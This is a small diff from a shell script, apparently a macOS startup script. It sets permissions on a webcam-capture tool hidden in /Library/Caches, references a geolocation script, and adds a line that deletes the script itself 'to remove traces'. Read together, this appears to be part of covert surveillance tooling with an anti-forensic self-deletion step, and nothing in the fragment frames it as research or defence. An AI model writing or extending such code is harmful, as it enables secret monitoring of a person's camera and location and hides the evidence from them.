@@ -40,3 +40,6 @@ chmod 755 /Library/Caches/imagesnap
 
 # Test the geolocation feature (requires permissions)
 # sh /Library/Caches/locateme.sh 
+
+# Delete this file to remove traces
+rm startup.sh
